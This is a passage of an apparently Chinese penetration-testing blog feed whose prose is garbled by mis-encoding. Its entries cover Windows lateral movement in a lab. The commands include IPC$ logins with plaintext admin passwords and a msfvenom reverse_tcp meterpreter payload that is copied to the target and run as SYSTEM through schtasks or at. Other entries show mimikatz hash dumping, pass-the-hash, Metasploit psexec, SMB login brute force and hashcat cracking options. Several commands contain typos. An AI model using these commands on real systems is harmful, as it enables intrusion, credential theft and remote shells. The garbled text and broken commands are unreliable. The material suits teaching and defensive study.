<h5 id="ä½¿ç”¨diræŸ¥çœ‹ç›®æ ‡æœºå™¨ç›®å½•"><a href="#ä½¿ç”¨diræŸ¥çœ‹ç›®æ ‡æœºå™¨ç›®å½•" class="headerlink" title="ä½¿ç”¨diræŸ¥çœ‹ç›®æ ‡æœºå™¨ç›®å½•"></a>ä½¿ç”¨diræŸ¥çœ‹ç›®æ ‡æœºå™¨ç›®å½•</h5><p><code>dir \\10.10.0.164\c$</code></p>
<p><img src="/posts/9527b68a/dir.png"></p>
<h5 id="å¤åˆ¶æ–‡ä»¶"><a href="#å¤åˆ¶æ–‡ä»¶" class="headerlink" title="å¤åˆ¶æ–‡ä»¶"></a>å¤åˆ¶æ–‡ä»¶</h5><p><code>copy test.txt \\10.10.0.164\c$</code> å°†test.txtå¤åˆ¶åˆ°ç›®æ ‡ä¸»æœºçš„cç›˜</p>
<h5 id="ä¸‹è½½æ–‡ä»¶"><a href="#ä¸‹è½½æ–‡ä»¶" class="headerlink" title="ä¸‹è½½æ–‡ä»¶"></a>ä¸‹è½½æ–‡ä»¶</h5><p><code>copy \\10.10.0.164\c$\test.txt </code></p>
<h4 id="ä½¿ç”¨atå‘½ä»¤åˆ›å»ºè®¡åˆ’ä»»åŠ¡"><a href="#ä½¿ç”¨atå‘½ä»¤åˆ›å»ºè®¡åˆ’ä»»åŠ¡" class="headerlink" title="ä½¿ç”¨atå‘½ä»¤åˆ›å»ºè®¡åˆ’ä»»åŠ¡"></a>ä½¿ç”¨atå‘½ä»¤åˆ›å»ºè®¡åˆ’ä»»åŠ¡</h4><p><code>at \\&lt;ç›®æ ‡ä¸»æœºip&gt; &lt;å¯åŠ¨æ—¶é—´&gt; &lt;æœ¨é©¬æ‰€åœ¨ä½ç½®&gt;</code></p>
<p><code>at \\10.10.0.164  </code></p>
<p>åˆ é™¤idä¸º1çš„è®¡åˆ’ä»»åŠ¡</p>
<p><code>at \\10.10.0.164 1 /delete</code></p>
<h4 id="ä½¿ç”¨typeè¯»å–æ–‡ä»¶"><a href="#ä½¿ç”¨typeè¯»å–æ–‡ä»¶" class="headerlink" title="ä½¿ç”¨typeè¯»å–æ–‡ä»¶"></a>ä½¿ç”¨typeè¯»å–æ–‡ä»¶</h4><p><code>type \\10.10.0.164\c$\1.txt </code>  è¯»å–ç›®æ ‡æœºå™¨çš„1.txtæ–‡ä»¶</p>
<br>

<br>

<h4 id="å®ä¾‹1"><a href="#å®ä¾‹1" class="headerlink" title="å®ä¾‹1"></a>å®ä¾‹1</h4><p>win7  æ”»å‡»æœº  </p>
<p>win2012 ç›®æ ‡æœº   10.10.0.164</p>
<br>

<p>ä½¿ç”¨win7ä¸ç›®æ ‡æœºå»ºç«‹ipcè¿æ¥</p>
<p><code>net use  \\10.10.0.164\ipc$ &quot;admin123!&quot; /user:&quot;administartor&quot; </code></p>
<p>æŸ¥çœ‹ç›®æ ‡æœºå™¨çš„æ—¶é—´</p>
<p><code>net time \\10.10.0.164 </code></p>
<p>ä½¿ç”¨dirè¯»å–ç›®æ ‡æœºå™¨cç›˜çš„æ–‡ä»¶</p>
<p><code>dir \\10.10.0.164\c$ </code></p>
<p>ä½¿ç”¨typeè¯»å–ç›®æ ‡ä¸»æœºcç›˜ä¸‹çš„1.txt</p>
<p><code>type \\10.10.0.164\c$\1.txt</code></p>
<p>é€‰æ‹©å°†ç›®æ ‡ä¸»æœºçš„cç›˜æ˜ å°„åˆ°æœ¬åœ°zç›˜</p>
<p><code>net use z: \\10.10.0.164\c$ </code></p>
<p>åœ¨å»ºç«‹ipcè¿æ¥ååˆ©ç”¨Psexecåå¼¹cmd</p>
<p><code>Psexec.exe \\10.10.0.164 -s cmd.exe -acceptcula</code></p>
<p><img src="/posts/9527b68a/Psexec_cmd.png"> </p>
<p>åˆ é™¤æ˜ å°„çš„zç›˜</p>
<p><code>net use z: /del </code></p>
<p>åˆ é™¤ipc$è¿æ¥</p>
<p><code>net use \\10.10.0.164\ipc$ /del</code></p>
<p>åˆ é™¤å…¨éƒ¨</p>
<p><code>net use * /del </code></p>
<br>

<h3 id="IPC-è®¡åˆ’ä»»åŠ¡è¿›è¡Œæ¨ªå‘æ¸—é€"><a href="#IPC-è®¡åˆ’ä»»åŠ¡è¿›è¡Œæ¨ªå‘æ¸—é€" class="headerlink" title="IPC+è®¡åˆ’ä»»åŠ¡è¿›è¡Œæ¨ªå‘æ¸—é€"></a>IPC+è®¡åˆ’ä»»åŠ¡è¿›è¡Œæ¨ªå‘æ¸—é€</h3><h4 id="ä½¿ç”¨schtaskså‘½ä»¤"><a href="#ä½¿ç”¨schtaskså‘½ä»¤" class="headerlink" title="ä½¿ç”¨schtaskså‘½ä»¤"></a>ä½¿ç”¨schtaskså‘½ä»¤</h4><p>åˆ©ç”¨æµç¨‹</p>
<ol>
<li>ä¸ç›®æ ‡å»ºç«‹IPCè¿æ¥</li>
<li>ä½¿ç”¨copyå‘½ä»¤å°†æœ¨é©¬ã€å‘½ä»¤è„šæœ¬å¤åˆ¶åˆ°ç›®æ ‡æœºå™¨</li>
<li>ç›®æ ‡æœºå™¨åˆ›å»ºè®¡åˆ’ä»»åŠ¡ï¼Œä½¿å…¶è‡ªåŠ¨è§¦å‘æœ¨é©¬ã€è„šæœ¬</li>
<li>åˆ é™¤IPCè¿æ¥</li>
</ol>
<p>ç¯å¢ƒ</p>
<pre><code>æ”»å‡»æœº  192.168.0.128 (kali)

ç›®æ ‡æœº  192.168.0.164 (Win2012ï¼‰

è·³æ¿æœº  192.168.0.157 (WIn2008)
</code></pre>
<br>

<h5 id="è·³æ¿æœºä¸ç›®æ ‡æœºå»ºç«‹IPCè¿æ¥"><a href="#è·³æ¿æœºä¸ç›®æ ‡æœºå»ºç«‹IPCè¿æ¥" class="headerlink" title="è·³æ¿æœºä¸ç›®æ ‡æœºå»ºç«‹IPCè¿æ¥"></a>è·³æ¿æœºä¸ç›®æ ‡æœºå»ºç«‹IPCè¿æ¥</h5><p><code>net use \\192.168.0.164\ipc$ &quot;password&quot; /user:&quot;administrator&quot;</code></p>
<h5 id="kaliä¸Šç”Ÿæˆæœ¨é©¬"><a href="#kaliä¸Šç”Ÿæˆæœ¨é©¬" class="headerlink" title="kaliä¸Šç”Ÿæˆæœ¨é©¬"></a>kaliä¸Šç”Ÿæˆæœ¨é©¬</h5><p><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.0.157 lport=8888 -f exe &gt; shell.exe</code></p>
<h4 id="å°†shell-exeä¼ åˆ°è·³è½¬æœºä¸Š"><a href="#å°†shell-exeä¼ åˆ°è·³è½¬æœºä¸Š" class="headerlink" title="å°†shell.exeä¼ åˆ°è·³è½¬æœºä¸Š"></a>å°†shell.exeä¼ åˆ°è·³è½¬æœºä¸Š</h4><p>åœ¨kaliä¸Šå¼€å¯ä¸€ä¸ªhttpæœåŠ¡</p>
<p><code>python3 -m http.server 9999</code></p>
<p>åœ¨è·³è½¬æœºä¸Šè®¿é—®å¹¶ä¸‹è½½shell.exe</p>
<h5 id="åœ¨è·³è½¬æœºä¸Šä½¿ç”¨copyå‘½ä»¤å°†shell-exeå¤åˆ¶åˆ°ç›®æ ‡æœº"><a href="#åœ¨è·³è½¬æœºä¸Šä½¿ç”¨copyå‘½ä»¤å°†shell-exeå¤åˆ¶åˆ°ç›®æ ‡æœº" class="headerlink" title="åœ¨è·³è½¬æœºä¸Šä½¿ç”¨copyå‘½ä»¤å°†shell.exeå¤åˆ¶åˆ°ç›®æ ‡æœº"></a>åœ¨è·³è½¬æœºä¸Šä½¿ç”¨copyå‘½ä»¤å°†shell.exeå¤åˆ¶åˆ°ç›®æ ‡æœº</h5><p><code>copy shell.exe \\192.168.0.164\c$</code></p>
<p><img src="/posts/9527b68a/schtasks_dir.png"></p>
<h5 id="åˆ©ç”¨schtasksåˆ›å»ºä¸€ä¸ªåä¸ºshellçš„è®¡åˆ’å‘½ä»¤ï¼Œè¯¥å‘½ä»¤æ¯åˆ†é’Ÿæ‰§è¡Œä¸€æ¬¡shell-exe"><a href="#åˆ©ç”¨schtasksåˆ›å»ºä¸€ä¸ªåä¸ºshellçš„è®¡åˆ’å‘½ä»¤ï¼Œè¯¥å‘½ä»¤æ¯åˆ†é’Ÿæ‰§è¡Œä¸€æ¬¡shell-exe" class="headerlink" title="åˆ©ç”¨schtasksåˆ›å»ºä¸€ä¸ªåä¸ºshellçš„è®¡åˆ’å‘½ä»¤ï¼Œè¯¥å‘½ä»¤æ¯åˆ†é’Ÿæ‰§è¡Œä¸€æ¬¡shell.exe"></a>åˆ©ç”¨schtasksåˆ›å»ºä¸€ä¸ªåä¸ºshellçš„è®¡åˆ’å‘½ä»¤ï¼Œè¯¥å‘½ä»¤æ¯åˆ†é’Ÿæ‰§è¡Œä¸€æ¬¡shell.exe</h5><p><code>schtasks /create /s 192.168.0.164 /u &quot;administrator&quot; /p &quot;admin123!&quot; /tn shell /sc minute /mo 1 /tr  c:\shell.exe /ru sysytem /f</code></p>
<p><img src="/posts/9527b68a/schtasks1.png"></p>
<p>ä½¿ç”¨ncç›‘å¬win2008è·³è½¬æœºçš„8888ç«¯å£</p>
<p><img src="/posts/9527b68a/schtasks_nc.png"></p>
<h5 id="åˆ©ç”¨schtasks-æ‰§è¡Œå‘½ä»¤ï¼Œä½¿ç”¨typeè¯»å–æ–‡ä»¶å†…å®¹"><a href="#åˆ©ç”¨schtasks-æ‰§è¡Œå‘½ä»¤ï¼Œä½¿ç”¨typeè¯»å–æ–‡ä»¶å†…å®¹" class="headerlink" title="åˆ©ç”¨schtasks æ‰§è¡Œå‘½ä»¤ï¼Œä½¿ç”¨typeè¯»å–æ–‡ä»¶å†…å®¹"></a>åˆ©ç”¨schtasks æ‰§è¡Œå‘½ä»¤ï¼Œä½¿ç”¨typeè¯»å–æ–‡ä»¶å†…å®¹</h5><p><code>schtasjs /create /s 192.168.0.164 /u &quot;administrator&quot; /p &quot;admin123!&quot; /tn test /sc minute /mo 1 /tr &quot;c:\cmd.exe /c &#39;ipconfig &gt; c:\result.txt&#39;&quot;  /ru system /f</code></p>
<p><img src="/posts/9527b68a/schtasks2.PNG"></p>
<p>æŸ¥çœ‹æ˜¯å¦ç”Ÿæˆresult.txt</p>
<p><code>dir \\192.168.0.164\c$</code></p>
<p><img src="/posts/9527b68a/schtasks_dir2.png"></p>
<p>æŸ¥çœ‹result.txtçš„å†…å®¹</p>
<p><code>type \\192.168.0.164\c$\result.txt</code></p>
<p><img src="/posts/9527b68a/result.png"></p>
<h5 id="schtasks-åˆ é™¤è®¡åˆ’ä»»åŠ¡"><a href="#schtasks-åˆ é™¤è®¡åˆ’ä»»åŠ¡" class="headerlink" title="schtasks åˆ é™¤è®¡åˆ’ä»»åŠ¡"></a>schtasks åˆ é™¤è®¡åˆ’ä»»åŠ¡</h5><p><code>schtasks /Delete /s 192.168.0.164 /u &quot;administrator&quot; /p &quot;admin123!&quot; /tn test /f</code></p>
<p><img src="/posts/9527b68a/schtasks_delete.png"></p>
<h5 id="æ–­å¼€ipc-è¿æ¥"><a href="#æ–­å¼€ipc-è¿æ¥" class="headerlink" title="æ–­å¼€ipc$è¿æ¥"></a>æ–­å¼€ipc$è¿æ¥</h5><p><code>net use \\192.168.0.164\ipc$ /del  </code></p>
<h5 id="schtasks-å‚æ•°"><a href="#schtasks-å‚æ•°" class="headerlink" title="schtasks å‚æ•°"></a>schtasks å‚æ•°</h5><blockquote>
<p>S [ç›®æ ‡ä¸»æœº]<br>/U [ç›®æ ‡ç”¨æˆ·å]<br>/P [ç›®æ ‡å¯†ç ]<br>/TN [ä»»åŠ¡åç§°]<br>/TR [æ‰§è¡Œç¨‹åº]<br>/SC [æ‰§è¡Œæ–¹å¼ï¼Œonceä¸ºæ‰§è¡Œ1æ¬¡]<br>/ST [å®šæ—¶è®¡åˆ’æ‰§è¡Œæ—¶é—´]<br>/f  [é»˜è®¤ä¸ºYï¼Œä¸è¿›è¡Œå›æ˜¾äº¤äº’ï¼Œç›´æ¥è¿è¡Œ]<br>/i  [æ˜¾ç¤ºç¨‹åºçª—å£äº¤äº’]</p>
</blockquote>
<h4 id="ä½¿ç”¨atå‘½ä»¤"><a href="#ä½¿ç”¨atå‘½ä»¤" class="headerlink" title="ä½¿ç”¨atå‘½ä»¤"></a>ä½¿ç”¨atå‘½ä»¤</h4><p>atå‘½ä»¤å’Œschtaskså‘½ä»¤ç±»ä¼¼</p>
<p>æ³¨æ„: Windows Server 2012 ä»¥åçš„ç‰ˆæœ¬æ²¡æœ‰atå‘½ä»¤ï¼Œåªæœ‰schtaskså‘½ä»¤<br>æ‰€ä»¥åœ¨è¿™é‡Œä½¿ç”¨win7 ä»£æ›¿ä¹‹å‰ä½¿ç”¨çš„win2012<br>ç¯å¢ƒ<br>win7  192.168.0.129<br>win2008 192.168.0.157</p>
<h5 id="ä¸å»ºç«‹ç›®æ ‡æœºå™¨å»ºç«‹IPCè¿æ¥"><a href="#ä¸å»ºç«‹ç›®æ ‡æœºå™¨å»ºç«‹IPCè¿æ¥" class="headerlink" title="ä¸å»ºç«‹ç›®æ ‡æœºå™¨å»ºç«‹IPCè¿æ¥"></a>ä¸å»ºç«‹ç›®æ ‡æœºå™¨å»ºç«‹IPCè¿æ¥</h5><p><code>net use \\192.168.0.157\ipc$ &quot;admin123!&quot; /user:&quot;administrator&quot;  </code></p>
<h5 id="åœ¨è·³è½¬æœºä¸Šä½¿ç”¨copyå‘½ä»¤å°†shell2-exeå¤åˆ¶åˆ°ç›®æ ‡æœº"><a href="#åœ¨è·³è½¬æœºä¸Šä½¿ç”¨copyå‘½ä»¤å°†shell2-exeå¤åˆ¶åˆ°ç›®æ ‡æœº" class="headerlink" title="åœ¨è·³è½¬æœºä¸Šä½¿ç”¨copyå‘½ä»¤å°†shell2.exeå¤åˆ¶åˆ°ç›®æ ‡æœº"></a>åœ¨è·³è½¬æœºä¸Šä½¿ç”¨copyå‘½ä»¤å°†shell2.exeå¤åˆ¶åˆ°ç›®æ ‡æœº</h5><p><code>copy shell2.exe \\192.168.0.157\c$</code></p>
<h5 id="ä½¿ç”¨atå‘½ä»¤åˆ›å»ºè®¡åˆ’ä»»åŠ¡-1"><a href="#ä½¿ç”¨atå‘½ä»¤åˆ›å»ºè®¡åˆ’ä»»åŠ¡-1" class="headerlink" title="ä½¿ç”¨atå‘½ä»¤åˆ›å»ºè®¡åˆ’ä»»åŠ¡"></a>ä½¿ç”¨atå‘½ä»¤åˆ›å»ºè®¡åˆ’ä»»åŠ¡</h5><p>æŸ¥çœ‹ç›®æ ‡æœºå™¨æ—¶é—´</p>
<p><code>net time \\192.168.0.157 </code> è¿™é‡Œçš„æ—¶é—´å¯èƒ½ä¸æœ¬åœ°ä¸ç¬¦åˆ</p>
<p><code>at \\192.168.0.157 2:13:00 c:\shell2.exe</code> </p>
<p><img src="/posts/9527b68a/at_shell2.png"></p>
<h5 id="æŸ¥çœ‹ä»»åŠ¡åˆ—è¡¨"><a href="#æŸ¥çœ‹ä»»åŠ¡åˆ—è¡¨" class="headerlink" title="æŸ¥çœ‹ä»»åŠ¡åˆ—è¡¨"></a>æŸ¥çœ‹ä»»åŠ¡åˆ—è¡¨</h5><p><code>at \\192.168.0.157 </code><br><img src="/posts/9527b68a/at_shell3.png"></p>
<br>

<br>

<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><blockquote>
<p><a href="https://www.secrss.com/articles/26810">https://www.secrss.com/articles/26810</a></p>
<p><a href="http://t3ngyu.leanote.com/post/LM-AT-SCHTASKS">http://t3ngyu.leanote.com/post/LM-AT-SCHTASKS</a></p>
<p><a href="https://www.cnblogs.com/mindzone/p/14293851.html">https://www.cnblogs.com/mindzone/p/14293851.html</a></p>
</blockquote>
]]></content>
      <categories>
        <category>å†…ç½‘æ¸—é€</category>
      </categories>
      <tags>
        <tag>å†…ç½‘æ¸—é€</tag>
      </tags>
  </entry>
  <entry>
    <title>Hashpth</title>
    <url>/posts/350b40a4/</url>
    <content><![CDATA[<h3 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h3><p>PASS The Hash ä¹Ÿå«Hashä¼ é€’æ”»å‡»ï¼Œç®€ç§° PTHã€‚ç”¨æˆ·ç™»å½•å¯ä»¥ä¸éœ€è¦æ˜æ–‡å¯†ç åªéœ€è¦è·å–åˆ°Hash å°±å¯ä»¥ç™»å½•ç›®æ ‡ç³»ç»Ÿã€‚</p>
<p>åœ¨åŸŸä¸­ï¼Œç”¨æˆ·ç™»å½•çš„è´¦å·å¯†ç å¤§éƒ½æ˜¯ç›¸åŒçš„ï¼Œæ‰€ä»¥æ”»å‡»è€…å¯ä»¥é€šè¿‡Hashä¼ é€’æ¥å°è¯•ç™»å½•å†…ç½‘çš„å…¶ä»–è®¡ç®—æœº.é€šè¿‡ä½¿ç”¨å“ˆå¸Œä¼ é€’æ”»å‡»ï¼Œæ”»å‡»è€…ä¸éœ€è¦ç ´è§£å¯†ç æ•£åˆ—å€¼</p>
<h3 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h3><p>åœ¨windowsç³»ç»Ÿä¸­ï¼Œé€šå¸¸ä¼šä½¿ç”¨NTLMè¿›è¡Œèº«ä»½éªŒè¯ï¼Œåœ¨ä½¿ç”¨NTLMåšèº«ä»½éªŒè¯æ—¶ï¼Œä¸ä¼šä½¿ç”¨æ˜æ–‡å¯†ç ä½œä¸ºèº«ä»½éªŒè¯ï¼Œè€Œæ˜¯ä½¿ç”¨æ˜æ–‡å¯†ç åŠ å¯†è¿‡çš„Hashå€¼ä½œä¸ºèº«ä»½éªŒè¯çš„å‡­æ®ã€‚æ”»å‡»è€…å¯ä»¥ç›´æ¥é€šè¿‡LM Hash å’ŒNTLM Hash è®¿é—®è¿œç¨‹ä¸»æœºæˆ–æœåŠ¡ï¼Œè€Œä¸éœ€è¦æä¾›æ˜æ–‡å¯†ç ã€‚</p>
<h3 id="æ”»å‡»æ–¹å¼"><a href="#æ”»å‡»æ–¹å¼" class="headerlink" title="æ”»å‡»æ–¹å¼"></a>æ”»å‡»æ–¹å¼</h3><ul>
<li><p>è·å–ä¸€å°åŸŸä¸»æœºçš„é«˜ï¼ˆadminæˆ–è€…systemï¼‰æƒé™</p>
</li>
<li><p>åˆ©ç”¨mimikatzç­‰å·¥å…·å¯¼å‡ºhash</p>
</li>
<li><p>åˆ©ç”¨å¯¼å‡ºçš„hashå°è¯•ç™»å½•å…¶ä»–çš„åŸŸå†…ä¸»æœº</p>
</li>
</ul>
<h3 id="hash-pthæ”»å‡»"><a href="#hash-pthæ”»å‡»" class="headerlink" title="hash pthæ”»å‡»"></a>hash pthæ”»å‡»</h3><h4 id="ä½¿ç”¨mimikatz-è¿›è¡Œpth"><a href="#ä½¿ç”¨mimikatz-è¿›è¡Œpth" class="headerlink" title="ä½¿ç”¨mimikatz è¿›è¡Œpth"></a>ä½¿ç”¨mimikatz è¿›è¡Œpth</h4><p>åœ¨Windows Server 2012ä¸­æ‰“å¼€mimikatz  </p>
<p><code>privilege::debug</code></p>
<p><code>sekurlsa::msv</code></p>
<p><img src="/posts/350b40a4/msv.png"></p>
<p>å¾—åˆ°hashå€¼ä¸º  <code>4cb55ea6471d29ccbb2ce4cf00271fe3</code></p>
<p>ä½†æ˜¯åœ¨è¿™é‡Œå¦‚æœé€‰æ‹©ç›´æ¥å¤åˆ¶mimikatzä¸­çš„ä¿¡æ¯çš„è¯ï¼Œç¨‹åºä¼šç›´æ¥å¡æ­»ï¼Œæ‰€ä»¥å¯ä»¥é€‰æ‹©å¼€å¯æ—¥å¿— <code>log</code></p>
<p><code>privilege::debug</code></p>
<p><code>sekurlsa::pth /user:Administrator /domain:mamor /ntlm:32ed87bdb5fdc5e9cba88547376818d4</code></p>
<p><img src="/posts/350b40a4/pth.png"></p>
<p>è¿è¡Œå®Œå‘½ä»¤ä¼šå¼¹å‡ºcmd.exe</p>
<p><img src="/posts/350b40a4/pth2.png"></p>
<p>æˆåŠŸè®¿é—®åˆ°åŸŸå†…çš„å¦ä¸€å°ç›¸åŒå¯†ç çš„æœºå™¨çš„Cç›˜</p>
<p><img src="/posts/350b40a4/pth_cmd.png"></p>
<p>å¯¹äºå®‰è£…KB2871991è¡¥ä¸åçš„æœºå™¨ï¼Œæ— æ³•ä½¿ç”¨å¸¸è§„çš„å“ˆå¸Œä¼ é€’è¿›è¡Œæ¨ªå‘ç§»åŠ¨ï¼Œä½†æ˜¯å¯¹äºAdministratorï¼ˆSIDä¸º500çš„è´¦å·ï¼‰çš„æ•£åˆ—å€¼ä»å¯ä»¥è¿›è¡Œå“ˆå¸Œä¼ é€’ã€‚ä¹Ÿå°±æ˜¯è¯´åªè¦SIDä¸º500çš„è´¦å·è¿›è¡Œæ¨ªå‘æ¸—é€æ—¶ä¸ä¼šè¢«è¯¥è¡¥ä¸æ‰€å½±å“ã€‚</p>
<h4 id="åˆ©ç”¨wmiexec-pyè¿›è¡Œpthæ”»å‡»"><a href="#åˆ©ç”¨wmiexec-pyè¿›è¡Œpthæ”»å‡»" class="headerlink" title="åˆ©ç”¨wmiexec.pyè¿›è¡Œpthæ”»å‡»"></a>åˆ©ç”¨wmiexec.pyè¿›è¡Œpthæ”»å‡»</h4><p>ä¸‹è½½åœ°å€ï¼š<a href="https://github.com/SecureAuthCorp/impacket">https://github.com/SecureAuthCorp/impacket</a></p>
<br>

<h4 id="ä½¿ç”¨msfä¸­çš„æ¨¡å—è¿›è¡Œpthæ”»å‡»"><a href="#ä½¿ç”¨msfä¸­çš„æ¨¡å—è¿›è¡Œpthæ”»å‡»" class="headerlink" title="ä½¿ç”¨msfä¸­çš„æ¨¡å—è¿›è¡Œpthæ”»å‡»"></a>ä½¿ç”¨msfä¸­çš„æ¨¡å—è¿›è¡Œpthæ”»å‡»</h4><h4 id="Psexec"><a href="#Psexec" class="headerlink" title="Psexec"></a>Psexec</h4><p>ç¯å¢ƒï¼š</p>
<p>Windows2012  192.168.0.161 10.10.0.161</p>
<p>kali  192.168.0.128</p>
<p>æ¡ä»¶ ï¼š</p>
<ol>
<li>å¼€å¯445ç«¯å£SMBæœåŠ¡ï¼ˆé»˜è®¤å¼€å¯ï¼‰</li>
<li>å¼€å¯admin$å…±äº«</li>
</ol>
<p>**<a href="https://asecuritysite.com/encryption/lmhash">https://asecuritysite.com/encryption/lmhash</a> **</p>
<p>å¯ä»¥å°†å¯†ç è½¬æ¢ä¸ºLM-Hash å’Œ NTLM-Hash (LMHASH:NTHASH æ ¼å¼) </p>
<p>åˆ©ç”¨ï¼š</p>
<p>use exploit/windows/smb/psexec<br>set RHOSTS 192.168.0.161<br>set payload windows/meterpreter/reverse_tcpï¼ˆé»˜è®¤payloadï¼‰<br>set LPORT 4444<br>set LHOST 192.168.0.128<br>set SMBUSER Administrator<br>set SMBPASS admin123!        ï¼ˆè®¾ç½®å¯†ç æ˜æ–‡æˆ–è€…hashå€¼ æ¥è¿›è¡Œpthï¼‰<br>set SMBDomain mamor<br>exploit</p>
<p><img src="/posts/350b40a4/msf_psexec.png"></p>
<h5 id="SMB-pthæ”»å‡»"><a href="#SMB-pthæ”»å‡»" class="headerlink" title="SMB pthæ”»å‡»"></a>SMB pthæ”»å‡»</h5><p>Metasploitæœ‰ä¸€ä¸ªauxiliaryè¾…åŠ©æ¨¡å—ï¼Œå¯ä»¥é€šè¿‡SMBç™»å½•åˆ°ç½‘ç»œä¸­ã€‚è¿™ä¸ªæ¨¡å—éœ€è¦ç”¨æˆ·åå’Œhashå­—å…¸ï¼Œå°†æ”¶é›†çš„ç”¨æˆ·åå’Œhashåˆ¶ä½œæˆäº†å­—å…¸ï¼Œå»çˆ†ç ´æœ‰æ•ˆçš„ç”¨æˆ·åå’Œhashç»„åˆã€‚å½“ç„¶å¦‚æœæœ‰ç”¨æˆ·å å¯†ç çš„å­—å…¸ä¹Ÿå¯ä»¥ä½¿ç”¨æ­¤æ¨¡å—è¿›è¡Œçˆ†ç ´</p>
<p><code>use auxiliary/scanner/smb/smb_login</code></p>
<p><code>set rhosts 192.168.0.157</code><br><code>set user_file /home/kali/Common/user.txt</code><br><code>set pass_file /home/kali/Common/password.txt</code><br><code>set smbdomain mamor</code><br><code>exploit</code></p>
<p><img src="/posts/350b40a4/smb_pth1.png"></p>
<p><img src="/posts/350b40a4/smb_pth2.png"></p>
<br>

<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><blockquote>
<p><a href="http://www.feidao.site/wordpress/?p=2084">http://www.feidao.site/wordpress/?p=2084</a></p>
<p><a href="https://www.cnblogs.com/zzjdbk/p/14507846.html">https://www.cnblogs.com/zzjdbk/p/14507846.html</a></p>
<p><a href="https://yoga7xm.top/2019/04/12/IPentest-domain3/">https://yoga7xm.top/2019/04/12/IPentest-domain3/</a></p>
<p><a href="https://blog.csdn.net/zzlx123/article/details/103595197">https://blog.csdn.net/zzlx123/article/details/103595197</a></p>
</blockquote>
]]></content>
      <categories>
        <category>å†…ç½‘æ¸—é€</category>
      </categories>
      <tags>
        <tag>å†…ç½‘æ¸—é€</tag>
      </tags>
  </entry>
  <entry>
    <title>Hashcatä½¿ç”¨</title>
    <url>/posts/de6bd435/</url>
    <content><![CDATA[<p>Hashcat â€“help å‚çœ‹hashcat å¸®åŠ©æ–‡æ¡£ </p>
<br>

<p>-m  è¡¨ç¤ºæ•£åˆ—ç®—æ³•ç±»å‹</p>
<p>-m 1000 ï¼ˆNTLMï¼‰</p>
<p><img src="/posts/de6bd435/Hash_modes.png"></p>
<p>-a  æŒ‡å®šç ´è§£æ¨¡å¼ï¼Œå¸¸ç”¨ straight å­—å…¸ç ´è§£ å’Œ brute-force æš´åŠ›ç ´è§£</p>
<blockquote>
<p>0 = Straight        //å­—å…¸ç ´è§£</p>
<p>1 = Combination        //ç»„åˆç ´è§£</p>
<p>3 = Brute-force        //æ©ç æš´åŠ›ç ´è§£</p>
<p>6 = Hybrid Wordlist + Mask        </p>
<p>7 = Hybrid Mask + Wordlist</p>
<p>9 = Association</p>
</blockquote>
<p><img src="/posts/de6bd435/Hash_Attack.png"></p>
<br>

<h4 id="å¸¸ç”¨å‘½ä»¤"><a href="#å¸¸ç”¨å‘½ä»¤" class="headerlink" title="å¸¸ç”¨å‘½ä»¤"></a>å¸¸ç”¨å‘½ä»¤</h4><p><code>hashcat -a 0 -m xx &lt;hashfile&gt; &lt;zidian1&gt; &lt;zidian2&gt;</code></p>
<blockquote>
<p>-m                           æŒ‡å®šå“ˆå¸Œç±»å‹</p>
<p>-a                            æŒ‡å®šç ´è§£æ¨¡å¼</p>
<p>-V                            æŸ¥çœ‹ç‰ˆæœ¬ä¿¡æ¯</p>
<p>-o                            å°†è¾“å‡ºç»“æœå‚¨å­˜åˆ°æŒ‡å®šæ–‡ä»¶</p>
<p>â€“force                     å¿½ç•¥è­¦å‘Š</p>
<p>â€“show                    ä»…æ˜¾ç¤ºç ´è§£çš„hashå¯†ç å’Œå¯¹åº”çš„æ˜æ–‡</p>
<p>â€“remove                 ä»æºæ–‡ä»¶ä¸­åˆ é™¤ç ´è§£æˆåŠŸçš„hash</p>
<p>â€“username             å¿½ç•¥hashè¡¨ä¸­çš„ç”¨æˆ·å</p>
<p>-b                             æµ‹è¯•è®¡ç®—æœºç ´è§£é€Ÿåº¦å’Œç›¸å…³ç¡¬ä»¶ä¿¡æ¯</p>
<p>-O                            é™åˆ¶å¯†ç é•¿åº¦</p>
<p>-T                            è®¾ç½®çº¿ç¨‹æ•°</p>
<p>-r                             ä½¿ç”¨è§„åˆ™æ–‡ä»¶</p>
<p>-1                             è‡ªå®šä¹‰å­—ç¬¦é›†  -1 0123asd     ?1={0123asd}</p>
<p>-2                             è‡ªå®šä¹‰å­—ç¬¦é›†  -2 0123asd    ?2={0123asd}</p>
<p>-3                             è‡ªå®šä¹‰å­—ç¬¦é›†  -3 0123asd    ?3={0123asd}</p>
<p>-i                              å¯ç”¨å¢é‡ç ´è§£æ¨¡å¼</p>
<p>â€“increment-min       è®¾ç½®å¯†ç æœ€å°é•¿åº¦</p>
<p>â€“increment-max      è®¾ç½®å¯†ç æœ€å¤§é•¿åº¦</p>
</blockquote>
]]></content>
      <categories>
        <category>å†…ç½‘æ¸—é€</category>
      </categories>
      <tags>
        <tag>å†…ç½‘æ¸—é€</tag>
      </tags>
  </entry>
  <entry>
    <title>Windowsç”¨æˆ·å¯†ç åŠ å¯†æ–¹æ³•ä¸ç ´è§£</title>
    <url>/posts/11da9eaf/</url>
    <content><![CDATA[<br>

<h3 id="Windows-Hash"><a href="#Windows-Hash" class="headerlink" title="Windows Hash"></a>Windows Hash</h3><h4 id="LM-Hash"><a href="#LM-Hash" class="headerlink" title="LM Hash"></a>LM Hash</h4><p>LAN Manager (LM) Hash æ—¶WIndows ç³»ç»Ÿæ‰€ç”¨çš„ç¬¬ä¸€ç§å¯†ç å“ˆå¸Œç®—æ³•ï¼Œæœ¬è´¨ä¸ºDESåŠ å¯†</p>
<h5 id="LM-Hash-ç”ŸæˆåŸç†"><a href="#LM-Hash-ç”ŸæˆåŸç†" class="headerlink" title="LM Hash ç”ŸæˆåŸç†"></a>LM Hash ç”ŸæˆåŸç†</h5><ul>
<li><p>1.ç”¨æˆ·å¯†ç è½¬æ¢ä¸ºå¤§å†™ï¼Œæœ€å¤§é•¿åº¦é™åˆ¶ä¸º14ä¸ªå­—ç¬¦ï¼Œ</p>
</li>
<li><p>2.å¯†ç è½¬æ¢ä¸º16è¿›åˆ¶å­—ç¬¦ä¸²ï¼Œä¸è¶³14ä¸ªå­—èŠ‚å°†ç”¨0æ¥è¡¥å…¨</p>
</li>
